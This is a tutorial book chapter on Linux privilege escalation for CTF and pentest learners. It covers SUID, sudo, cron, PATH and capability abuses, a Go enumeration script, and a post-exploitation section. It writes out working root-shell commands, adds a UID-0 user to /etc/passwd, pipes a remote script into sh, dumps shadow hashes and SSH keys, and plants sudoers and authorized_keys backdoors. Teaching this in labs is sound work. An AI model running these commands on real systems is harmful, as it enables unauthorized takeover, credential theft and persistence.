# Chapter 30: Privilege Escalation — From User to Root

*You've got a shell. Now you need root. Privilege escalation is the art of going from limited access to full control. This is where most CTF challenges and real-world attacks spend their time.*

---

## The Goal

After initial access, you typically land as:
- A low-privilege user (www-data, nobody, a web service account)
- A regular user account (john, guest)

Goal: become **root** (on Linux) or **SYSTEM/Administrator** (on Windows).

With root: read any file, modify any process, install backdoors, steal all credentials.

---

## The Methodology

```
1. Enumerate — gather everything about the system
2. Analyze — what's unusual? what shouldn't be there?
3. Exploit — use the finding to escalate
4. Verify — confirm you have root
5. Post-exploit — persistence, lateral movement
```

Don't skip enumeration. Most beginners jump straight to running exploits. Professionals enumerate methodically.

---

## Linux Privilege Escalation

### 1. System Information

```bash
# What OS and kernel version?
uname -a
cat /etc/os-release
cat /proc/version

# Architecture (important for exploit selection)
uname -m     # x86_64, i686, ARM, etc.

# What processes are running as root?
ps aux | grep root

# What services are running?
systemctl list-units --type=service --state=running
```

### 2. Current User and Group Context

```bash
id                          # uid, gid, groups
whoami
cat /etc/passwd             # all users
cat /etc/group              # all groups
cat /etc/shadow 2>/dev/null # password hashes (root only usually)

# Can you sudo?
sudo -l                     # what can you run as sudo?
# This is gold — even partial sudo can be escalated
```

### 3. SUID/SGID Binaries

SUID files run as their **owner** (often root), regardless of who runs them.

```bash
# Find all SUID files
find / -perm -4000 -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null

# Common dangerous SUID binaries
# bash, find, vim, python, perl, cp, chmod, chown, nmap (older)
```

**Example — SUID bash:**
```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash
# the 's' in 'rws' means SUID

/bin/bash -p      # -p keeps effective UID (root!)
whoami            # root
```

**GTFOBins** (gtfobins.github.io) — comprehensive reference for SUID/sudo escalations.

**Example — SUID find:**
```bash
find / -exec /bin/bash -p \; -quit
# find runs as root (SUID), exec spawns bash with root privileges
```

**Example — sudo vim:**
```bash
sudo vim
# Inside vim, type:
:!whoami          # runs shell command as root
:!/bin/bash       # drop into root shell
:shell            # interactive root shell
```

### 4. Sudo Misconfigurations

```bash
sudo -l
# Common dangerous examples:

# Can run anything as root:
# (ALL) ALL
sudo bash              # instant root

# Can run specific binary:
# (root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.execv("/bin/bash", ["bash"])'

# Can edit files:
# (root) NOPASSWD: /usr/bin/vim /etc/sudoers
# Edit sudoers to give yourself full sudo access

# Can run scripts in a writable directory:
# (root) NOPASSWD: /opt/scripts/backup.sh
# If you can write to /opt/scripts/ → replace backup.sh with your payload
```

### 5. Cron Jobs

```bash
# System cron
cat /etc/crontab
ls /etc/cron.d/
ls /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/

# Look for:
# 1. Scripts that run as root
# 2. Scripts in world-writable directories
# 3. Scripts that use PATH without specifying full paths

# Example vulnerable crontab:
# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt
# * * * * * root cleanup.sh
# If /opt is writable and 'cleanup.sh' isn't found elsewhere, place yours there!

# Monitor cron execution (pspy — no root needed)
# pspy watches /proc for new processes
./pspy64
```

### 6. Writable Files and Directories

```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys

# World-writable directories
find / -writable -type d 2>/dev/null | grep -v /proc | grep -v /sys

# Critical writable files:
# /etc/passwd   → can add root user
# /etc/sudoers  → can grant yourself full sudo
# /etc/crontab  → can add root cron job
# /root/.ssh/authorized_keys → if writable, add your SSH key!

# Adding a root user to /etc/passwd (if writable):
# Format: username:password_hash:UID:GID:comment:home:shell
# Generate the hash FIRST (use double quotes / command substitution here),
# then append the line. Single quotes would write the literal $(...) text.
HASH=$(openssl passwd -1 password)
echo "hacker:${HASH}:0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker   # enter: password
whoami      # root
```

### 7. PATH Hijacking

If a SUID binary or root-run script calls programs without full paths:

```bash
# Vulnerable script (running as root, in cron):
#!/bin/bash
tar czf backup.tar.gz /home/   # 'tar' found via PATH

# Attack:
echo "/bin/bash" > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
# When the script runs next, it executes /tmp/tar instead of /usr/bin/tar
```

### 8. Kernel Exploits

When all else fails, exploit the kernel itself.

```bash
uname -r       # get kernel version
# Research: "Linux kernel 5.4.0 privilege escalation"
# CVE databases: nvd.nist.gov, exploit-db.com

# Famous kernel exploits:
# DirtyCow (CVE-2016-5195) — Linux < 4.8.3
# OverlayFS (CVE-2021-3493) — Ubuntu specific
# PwnKit (CVE-2021-4034) — pkexec in all major distros!
```

**DirtyCow example:** Race condition in copy-on-write memory. Let's you write to read-only memory (like `/etc/passwd`).

```bash
# Check if vulnerable
uname -r   # needs to be < 4.8.3 for classic DirtyCow

# Exploit would modify /etc/passwd to add root user
# (demonstration only — always in authorized test environments)
```

### 9. Service Vulnerabilities

```bash
# Find processes running as root
ps aux | grep "^root" | awk '{print $11}' | sort -u

# Check versions of running services
nginx -v
apache2 -v
mysql --version
# Search CVE databases for known vulnerabilities in these versions

# Exposed internal services (127.0.0.1 only)
ss -tulpn | grep 127.0.0.1
# Services only accessible locally often have weaker security
# Port forward them to attack from outside
```

### 10. Capabilities

Linux capabilities give fine-grained root powers without full root.

```bash
# Find files with capabilities set
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid    → set any UID → become root
# cap_net_raw   → raw sockets → can sniff network
# cap_dac_override → bypass file permissions

# Example: python with cap_setuid
# /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Automated Enumeration Tools

Real pentesters use automated tools to find things fast:

```bash
# LinPEAS — most comprehensive
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh

# Pspy — monitor processes without root
./pspy64
```

But always understand what the tools find. Automated tools flag possibilities; you decide what's exploitable.

---

## Building a Privilege Escalation Checker in Go

```go
package main

import (
    "fmt"
    "os"
    "os/exec"
    "strings"
)

func runCommand(cmd string, args ...string) string {
    out, err := exec.Command(cmd, args...).Output()
    if err != nil {
        return ""
    }
    return strings.TrimSpace(string(out))
}

func checkSUID() {
    fmt.Println("\n[*] SUID Binaries:")
    out, _ := exec.Command("find", "/", "-perm", "-4000", "-type", "f").Output()
    lines := strings.Split(string(out), "\n")
    for _, line := range lines {
        if line != "" {
            fmt.Println("  [SUID]", line)
        }
    }
}

func checkSudo() {
    fmt.Println("\n[*] Sudo permissions:")
    out, err := exec.Command("sudo", "-l").Output()
    if err != nil {
        fmt.Println("  Cannot run sudo -l")
        return
    }
    fmt.Println(string(out))
}

func checkCron() {
    fmt.Println("\n[*] Cron jobs:")
    files := []string{
        "/etc/crontab",
        "/etc/cron.d/",
        "/var/spool/cron/",
    }
    for _, f := range files {
        if _, err := os.Stat(f); err == nil {
            out, _ := exec.Command("cat", f).Output()
            if len(out) > 0 {
                fmt.Printf("  [%s]\n%s\n", f, out)
            }
        }
    }
}

func checkWritable() {
    fmt.Println("\n[*] Writable critical files:")
    critical := []string{
        "/etc/passwd",
        "/etc/shadow",
        "/etc/sudoers",
        "/etc/crontab",
        "/root/.ssh/authorized_keys",
    }
    for _, path := range critical {
        f, err := os.OpenFile(path, os.O_WRONLY, 0)
        if err == nil {
            f.Close()
            fmt.Printf("  [WRITABLE] %s !!!\n", path)
        }
    }
}

func checkCapabilities() {
    fmt.Println("\n[*] File Capabilities:")
    out, _ := exec.Command("getcap", "-r", "/").CombinedOutput()
    if len(out) > 0 {
        fmt.Println(string(out))
    }
}

func main() {
    fmt.Println("=== Privilege Escalation Checker ===")
    fmt.Printf("[*] Running as: uid=%d gid=%d\n", os.Getuid(), os.Getgid())
    fmt.Printf("[*] Hostname: %s\n", runCommand("hostname"))
    fmt.Printf("[*] Kernel: %s\n", runCommand("uname", "-r"))
    
    checkSUID()
    checkSudo()
    checkCron()
    checkWritable()
    checkCapabilities()
    
    fmt.Println("\n[+] Done. Analyze findings carefully.")
}
```

```bash
# Cross-compile for Linux target
GOOS=linux GOARCH=amd64 go build -o privesc-check main.go
# Transfer to target, run:
./privesc-check
```

---

## Post-Exploitation — What Root Does

Once root:

```bash
# 1. Dump password hashes
cat /etc/shadow
# Crack offline with hashcat

# 2. Find SSH keys
find /home /root -name "id_rsa" 2>/dev/null
find /home /root -name "*.pem" 2>/dev/null

# 3. Search for credentials
grep -r "password" /var/www/ 2>/dev/null
grep -r "DB_PASSWORD" /var/www/ 2>/dev/null
find / -name "*.env" 2>/dev/null

# 4. Establish persistence
echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
# Or add SSH key to root
mkdir -p /root/.ssh
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

---

## Summary

| Technique | Check |
|-----------|-------|
| SUID binaries | `find / -perm -4000` + GTFOBins |
| Sudo misconfig | `sudo -l` → look for exploitable binaries |
| Cron jobs | `/etc/crontab`, `/etc/cron.d/`, pspy |
| Writable files | `/etc/passwd`, `/etc/sudoers` writable? |
| PATH hijacking | Root scripts calling commands without full path? |
| Capabilities | `getcap -r /` → look for cap_setuid |
| Kernel exploits | `uname -r` → search CVEs |
| Service vulns | Running services with known CVEs? |

---

## Exercises

1. Set up a vulnerable VM (TryHackMe "Linux PrivEsc" room)
2. Find an SUID binary and escalate to root using GTFOBins
3. Run LinPEAS on a test system and analyze the output
4. Build a vulnerable cron-based privilege escalation scenario yourself, then exploit it
5. Extend the Go checker to also enumerate world-writable directories
